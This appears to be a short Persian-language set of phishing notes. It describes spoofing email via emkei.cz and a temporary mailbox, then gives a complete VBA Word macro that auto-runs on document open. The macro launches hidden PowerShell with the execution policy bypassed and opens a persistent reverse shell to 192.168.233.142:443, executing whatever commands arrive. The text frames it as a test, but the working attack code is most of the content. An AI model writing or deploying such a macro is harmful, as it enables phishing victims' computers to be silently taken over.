
یکی از روش های فیشینگ استفاده از منابع عمومی هستش 

## https://emkei.cz/


![[Pasted image 20260104180050.png]]

ساخت یه ایمیل فیک 
در قدم اول یک ایمیل fake میگیریم  از سایت tempmail مثلا 

![[Pasted image 20260104184737.png]]


![[Pasted image 20260104184801.png]]


![[Pasted image 20260104184812.png]]

## نکته : 😂😂 این اینستاگرام طبیعتا نباید میبود در سناریو واقعی این شکلی نیست برای تست دیدین دیگه 


```powershell
Sub Document_Open()
    test
End Sub

Sub AutoOpen()
    test
End Sub

Sub test()
    ' test Macro
    Dim objshell As Object
    Set objshell = CreateObject("Wscript.Shell")
    objshell.Run "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command ""$command = {while($true){try {$cl = New-Object System.Net.Sockets.TcpClient('192.168.233.142',443);$st = $cl.GetStream();$rd = New-Object IO.StreamReader($st);$wr = New-Object IO.StreamWriter($st);$wr.AutoFlush = $true;while($cl.Connected){$cmd = $rd.ReadLine();if($cmd -eq 'exit'){break;}try{$res = iex $cmd 2>&1 | Out-String;}catch{$res = $_.Exception.Message;} $wr.WriteLine($res);$wr.Flush();}$cl.Close();}catch{Start-Sleep -Seconds 10;}}}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', $command"""
    Set objshell = Nothing
End Sub

```
